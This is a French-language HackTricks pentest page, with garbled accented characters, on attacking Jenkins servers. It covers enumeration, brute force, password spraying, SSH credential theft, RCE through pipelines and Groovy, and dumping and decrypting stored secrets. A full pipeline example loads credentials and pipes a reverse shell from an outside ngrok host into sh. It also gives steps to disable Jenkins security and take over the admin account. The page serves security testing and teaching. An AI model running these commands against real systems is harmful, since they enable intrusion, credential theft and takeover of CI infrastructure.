# S√©curit√© de Jenkins

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## Informations de base

Jenkins est un outil qui offre une m√©thode simple pour √©tablir un environnement d'int√©gration continue ou de d√©ploiement continu (CI/CD) pour presque **toute** combinaison de **langages de programmation** et de r√©f√©rentiels de code source en utilisant des pipelines. De plus, il automatise diverses t√¢ches de d√©veloppement routini√®res. Bien que Jenkins n'√©limine pas le **besoin de cr√©er des scripts pour des √©tapes individuelles**, il fournit un moyen plus rapide et plus robuste d'int√©grer l'ensemble de la s√©quence d'outils de construction, de test et de d√©ploiement que l'on peut facilement construire manuellement.

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## √ânum√©ration non authentifi√©e

Pour rechercher des pages Jenkins int√©ressantes sans authentification comme (_/people_ ou _/asynchPeople_, qui r√©pertorie les utilisateurs actuels), vous pouvez utiliser :
```
msf> use auxiliary/scanner/http/jenkins_enum
```
V√©rifiez si vous pouvez ex√©cuter des commandes sans avoir besoin d'authentification :
```
msf> use auxiliary/scanner/http/jenkins_command
```
Sans identifiants, vous pouvez regarder √† l'int√©rieur du chemin _**/asynchPeople/**_ ou _**/securityRealm/user/admin/search/index?q=**_ pour les **noms d'utilisateur**.

Vous pouvez peut-√™tre obtenir la version de Jenkins √† partir du chemin _**/oops**_ ou _**/error**_

![](<../../.gitbook/assets/image (146).png>)

### Vuln√©rabilit√©s Connues

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## Connexion

Dans les informations de base, vous pouvez v√©rifier **toutes les fa√ßons de vous connecter √† Jenkins**:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Enregistrement

Vous pourrez trouver des instances de Jenkins qui **vous permettent de cr√©er un compte et de vous connecter √† l'int√©rieur. Aussi simple que cela.**

### **Connexion SSO**

√âgalement, si la **fonctionnalit√©/plugins SSO** √©taient pr√©sents, vous devriez essayer de **vous connecter** √† l'application en utilisant un compte de test (par exemple, un compte **Github/Bitbucket** de test). Astuce provenant de [**ici**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### Bruteforce

**Jenkins** manque de **politique de mot de passe** et de **mitigation de la force brute pour les noms d'utilisateur**. Il est essentiel de **forcer la recherche** des utilisateurs car des **mots de passe faibles** ou des **noms d'utilisateur comme mots de passe** peuvent √™tre utilis√©s, voire des **noms d'utilisateur invers√©s comme mots de passe**.
```
msf> use auxiliary/scanner/http/jenkins_login
```
### Password spraying

Utilisez [ce script python](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) ou [ce script powershell](https://github.com/chryzsh/JenkinsPasswordSpray).

### Contournement du filtrage par adresse IP

De nombreuses organisations combinent des **syst√®mes de gestion de contr√¥le de source (SCM) bas√©s sur le cloud** tels que GitHub ou GitLab avec une solution **CI auto-h√©berg√©e interne** comme Jenkins ou TeamCity. Cette configuration permet aux syst√®mes CI de **recevoir des √©v√©nements de webhook des fournisseurs de contr√¥le de source bas√©s sur le cloud**, principalement pour d√©clencher des t√¢ches de pipeline.

Pour ce faire, les organisations **autorisent en liste blanche** les **plages d'adresses IP** des **plateformes SCM**, leur permettant d'acc√©der au **syst√®me CI interne** via des **webhooks**. Cependant, il est important de noter que **n'importe qui** peut cr√©er un **compte** sur GitHub ou GitLab et le configurer pour **d√©clencher un webhook**, envoyant potentiellement des requ√™tes au **syst√®me CI interne**.

V√©rifiez : [shttps://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## Abus internes de Jenkins

Dans ces sc√©narios, nous supposons que vous disposez d'un compte valide pour acc√©der √† Jenkins.

{% hint style="warning" %}
En fonction du m√©canisme d'**Autorisation** configur√© dans Jenkins et des autorisations de l'utilisateur compromis, vous **pourriez √™tre en mesure ou non d'effectuer les attaques suivantes**.
{% endhint %}

Pour plus d'informations, consultez les informations de base :

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Liste des utilisateurs

Si vous avez acc√©d√© √† Jenkins, vous pouvez lister les autres utilisateurs enregistr√©s sur [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)

### Extraction des builds pour trouver des secrets en clair

Utilisez [ce script](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py) pour extraire les sorties de console de build et les variables d'environnement de build afin de trouver des secrets en clair.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **Vol de cr√©dentiels SSH**

Si l'utilisateur compromis a **suffisamment de privil√®ges pour cr√©er/modifier un nouveau n≈ìud Jenkins** et que des cr√©dentiels SSH sont d√©j√† stock√©s pour acc√©der √† d'autres n≈ìuds, il pourrait **voler ces cr√©dentiels** en cr√©ant/modifiant un n≈ìud et **en d√©finissant un h√¥te qui enregistrera les cr√©dentiels** sans v√©rifier la cl√© d'h√¥te :

![](<../../.gitbook/assets/image (218).png>)

Vous trouverez g√©n√©ralement les cr√©dentiels SSH de Jenkins dans un **fournisseur global** (`/credentials/`), vous pouvez donc √©galement les extraire comme vous le feriez pour tout autre secret. Plus d'informations dans la [**section Extraction de secrets**](./#dumping-secrets).

### **RCE dans Jenkins**

Obtenir un **shell dans le serveur Jenkins** donne √† l'attaquant l'opportunit√© de divulguer tous les **secrets** et **variables d'environnement** et d'**exploiter d'autres machines** situ√©es dans le m√™me r√©seau ou m√™me de **collecter des cr√©dentiels cloud**.

Par d√©faut, Jenkins **s'ex√©cutera en tant que SYSTEM**. Ainsi, le compromettre donnera √† l'attaquant des **privil√®ges SYSTEM**.

### **RCE Cr√©ation/Modification d'un projet**

Cr√©er/Modifier un projet est une fa√ßon d'obtenir une RCE sur le serveur Jenkins :

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **RCE Ex√©cuter un script Groovy**

Vous pouvez √©galement obtenir une RCE en ex√©cutant un script Groovy, ce qui pourrait √™tre plus discret que de cr√©er un nouveau projet :

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### RCE Cr√©ation/Modification de Pipeline

Vous pouvez √©galement obtenir une **RCE en cr√©ant/modifiant un pipeline** :

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Exploitation de Pipeline

Pour exploiter les pipelines, vous devez toujours avoir acc√®s √† Jenkins.

### Construire des Pipelines

Les **pipelines** peuvent √©galement √™tre utilis√©s comme **m√©canisme de construction dans les projets**, dans ce cas, un **fichier √† l'int√©rieur du d√©p√¥t** peut √™tre configur√© pour contenir la syntaxe du pipeline. Par d√©faut, `/Jenkinsfile` est utilis√© :

![](<../../.gitbook/assets/image (127).png>)

Il est √©galement possible de **stocker des fichiers de configuration de pipeline ailleurs** (dans d'autres d√©p√¥ts par exemple) dans le but de **s√©parer** l'acc√®s au d√©p√¥t et l'acc√®s au pipeline.

Si un attaquant a **acc√®s en √©criture √† ce fichier**, il pourra le **modifier** et **d√©clencher potentiellement** le pipeline sans m√™me avoir acc√®s √† Jenkins.\
Il est possible que l'attaquant doive **contourner certaines protections de branche** (selon la plateforme et les privil√®ges de l'utilisateur, elles pourraient √™tre contourn√©es ou non).

Les d√©clencheurs les plus courants pour ex√©cuter un pipeline personnalis√© sont :

* **Pull request** vers la branche principale (ou potentiellement vers d'autres branches)
* **Pousser vers la branche principale** (ou potentiellement vers d'autres branches)
* **Mettre √† jour la branche principale** et attendre qu'elle soit ex√©cut√©e d'une mani√®re ou d'une autre

{% hint style="info" %}
Si vous √™tes un **utilisateur externe**, vous ne devriez pas vous attendre √† cr√©er une **PR vers la branche principale** du d√©p√¥t d'un **autre utilisateur/organisation** et **d√©clencher le pipeline**... mais s'il est **mal configur√©**, vous pourriez compromettre compl√®tement des entreprises en exploitant cela.
{% endhint %}

### RCE de Pipeline

Dans la section RCE pr√©c√©dente, une technique pour [**obtenir une RCE en modifiant un pipeline**](./#rce-creating-modifying-pipeline) a d√©j√† √©t√© indiqu√©e.

### V√©rification des variables d'environnement

Il est possible de d√©clarer des **variables d'environnement en texte clair** pour l'ensemble du pipeline ou pour des √©tapes sp√©cifiques. Ces variables d'environnement **ne devraient pas contenir d'informations sensibles**, mais un attaquant pourrait toujours **v√©rifier l'ensemble du pipeline** configurations/Jenkinsfiles :
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### Extraction de secrets

Pour des informations sur la mani√®re dont les secrets sont g√©n√©ralement trait√©s par Jenkins, consultez les informations de base :

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Les informations d'identification peuvent √™tre **d√©finies pour les fournisseurs globaux** (`/credentials/`) ou pour des **projets sp√©cifiques** (`/job/<nom-du-projet>/configure`). Par cons√©quent, pour exfiltrer tous les secrets, vous devez **compromettre au moins tous les projets** contenant des secrets et ex√©cuter des pipelines personnalis√©s/empoisonn√©s.

Il y a un autre probl√®me, pour obtenir un **secret dans l'environnement** d'un pipeline, vous devez **conna√Ætre le nom et le type du secret**. Par exemple, si vous essayez de **charger** un **secret `usernamePassword`** en tant que **secret de type `string`**, vous obtiendrez cette **erreur**:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
Voici la mani√®re de charger certains types de secrets courants :
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
√Ä la fin de cette page, vous pouvez **trouver tous les types d'informations d'identification**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
La meilleure fa√ßon de **dumper toutes les secrets en une fois** est de **compromettre** la machine **Jenkins** (en ex√©cutant par exemple un shell invers√© dans le **n≈ìud int√©gr√©**) puis de **fuir** les **cl√©s ma√Ætresses** et les **secrets chiffr√©s** et de les d√©crypter hors ligne.\
Pour en savoir plus sur la fa√ßon de faire cela, consultez la section [Nodes & Agents](./#nodes-and-agents) et la section [Post Exploitation](./#post-exploitation).
{% endhint %}

### D√©clencheurs

D'apr√®s [la documentation](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers): La directive `triggers` d√©finit les **m√©thodes automatis√©es par lesquelles le Pipeline doit √™tre relanc√©**. Pour les Pipelines int√©gr√©s √† une source telle que GitHub ou BitBucket, les `triggers` peuvent ne pas √™tre n√©cessaires car une int√©gration bas√©e sur les webhooks sera probablement d√©j√† pr√©sente. Les d√©clencheurs actuellement disponibles sont `cron`, `pollSCM` et `upstream`.

Exemple de Cron:
```bash
triggers { cron('H */4 * * 1-5') }
```
Consultez **d'autres exemples dans la documentation**.

### Noeuds & Agents

Une **instance de Jenkins** peut avoir **diff√©rents agents s'ex√©cutant sur diff√©rentes machines**. Du point de vue d'un attaquant, l'acc√®s √† diff√©rentes machines signifie **diff√©rentes informations d'identification cloud potentielles** √† voler ou **diff√©rents acc√®s r√©seau** qui pourraient √™tre exploit√©s pour attaquer d'autres machines.

Pour plus d'informations, consultez les informations de base :

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Vous pouvez √©num√©rer les **noeuds configur√©s** dans `/computer/`, vous trouverez g√©n√©ralement le \*\*`Noeud Int√©gr√©` \*\* (qui est le noeud ex√©cutant Jenkins) et potentiellement d'autres :

![](<../../.gitbook/assets/image (249).png>)

Il est **particuli√®rement int√©ressant de compromettre le noeud int√©gr√©** car il contient des informations sensibles sur Jenkins.

Pour indiquer que vous souhaitez **ex√©cuter** le **pipeline** dans le **noeud Jenkins int√©gr√©**, vous pouvez sp√©cifier dans le pipeline la configuration suivante :
```bash
pipeline {
agent {label 'built-in'}
```
### Exemple complet

Pipeline dans un agent sp√©cifique, avec un d√©clencheur cron, avec des variables d'environnement de pipeline et de stage, chargement de 2 variables dans une √©tape et envoi d'un shell invers√©:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## Post Exploitation

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Secrets de Jenkins

Vous pouvez lister les secrets en acc√©dant √† `/credentials/` si vous avez suffisamment de permissions. Notez que cela ne listera que les secrets √† l'int√©rieur du fichier `credentials.xml`, mais les **fichiers de configuration de build** peuvent √©galement contenir **davantage de credentials**.

Si vous pouvez **voir la configuration de chaque projet**, vous pouvez √©galement y voir les **noms des credentials (secrets)** utilis√©s pour acc√©der au d√©p√¥t et **d'autres credentials du projet**.

![](<../../.gitbook/assets/image (180).png>)

#### En Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### Depuis le disque

Ces fichiers sont n√©cessaires pour **d√©crypter les secrets de Jenkins** :

* secrets/master.key
* secrets/hudson.util.Secret

De tels **secrets peuvent g√©n√©ralement √™tre trouv√©s dans** :

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

Voici une regex pour les trouver :
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### D√©chiffrer les secrets de Jenkins hors ligne

Si vous avez extrait les **mots de passe n√©cessaires pour d√©chiffrer les secrets**, utilisez [**ce script**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) **pour d√©chiffrer ces secrets**.
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### D√©chiffrer les secrets Jenkins √† partir de Groovy
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### Cr√©er un nouvel utilisateur administrateur

1. Acc√©dez au fichier config.xml de Jenkins dans `/var/lib/jenkins/config.xml` ou `C:\Program Files (x86)\Jenkins\`
2. Recherchez le mot `<useSecurity>true</useSecurity>` et changez le mot **`true`** en **`false`**.
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Red√©marrez** le serveur **Jenkins** : `service jenkins restart`
4. Retournez sur le portail Jenkins et **Jenkins ne demandera pas de mots de passe** cette fois. Acc√©dez √† "**G√©rer Jenkins**" pour d√©finir √† nouveau le **mot de passe administrateur**.
5. **Activez** √† nouveau la **s√©curit√©** en modifiant les param√®tres en `<useSecurity>true</useSecurity>` et **red√©marrez Jenkins √† nouveau**.

## R√©f√©rences

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
